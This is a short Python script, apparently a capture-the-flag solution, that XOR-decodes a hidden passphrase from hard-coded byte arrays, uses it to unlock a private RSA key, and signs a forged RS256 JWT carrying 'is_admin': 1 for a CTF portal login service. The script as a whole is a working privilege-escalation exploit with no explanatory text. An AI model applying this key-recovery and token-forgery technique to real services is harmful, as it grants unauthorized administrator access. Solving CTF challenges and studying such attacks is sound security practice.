index = [0x17, 0x1a, 7, 3, 0x13, 1, 8, 0xe, 0x1b, 9, 0x1c, 0x14, 2, 0xf, 0x10, 0x11,
             0x18, 5, 0x12, 0x19, 6, 0, 0x15, 0xd, 4, 0x16, 0x1f, 0x1e, 0xc, 0x1d, 0xb, 10]

key = [0xe7, 0x7b, 0x69, 0xf, 0x36, 0x4b, 1, 0x4a, 0xc1, 0x19, 0x38, 0x4f, 0x17, 0xe9,
             0xa0, 0x98, 0xc4, 0xff, 0x40, 0x7c, 0x78, 0x69, 0x45, 0x56, 0x49, 0x78, 0x96, 0x7c,
             0xfc, 0xf9, 0x4f, 0x54]

signature = [0xd7, 0x1f, 0x5f, 0x6a, 0x54, 0x72, 0x32, 0x2b, 0xa0, 0x7a, 0x5d, 0x7c, 0x24, 0xde,
             0xc4, 0xad, 0xf0, 0xcd, 0x23, 0x4b, 0x1b, 0x5f, 0x20, 99, 0x7f, 0x4f, 0xf7, 0x19,
             0xc9, 0x98, 0x2c, 0x36]

valid = [a ^ b for a, b in zip(key, signature)]
passphrase = [0] * 32

for x in range(0x20):
    passphrase[index[x]] = valid[x]

passphrase = ''.join([chr(x) for x in passphrase]).encode()

import jwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
with open('private.pem', 'rb') as f:
    private_key_pem = f.read()


private_key = serialization.load_pem_private_key(
    private_key_pem,
    password=passphrase,
    backend=default_backend()
)

payload = {
  "iss": "http://ctf.protergo.party:10004/api/portal_login",
  "iat": 1707430259,
  "exp": 1707433859,
  "nbf": 1707430259,
  "jti": "XgXgBdNdrp5SXoYE",
  "sub": "29",
  "prv": "3da04507aadf132cee732fdee4ef6aa390dec579",
  "is_admin": 1
}
token = jwt.encode(payload, private_key, algorithm='RS256')
print(token)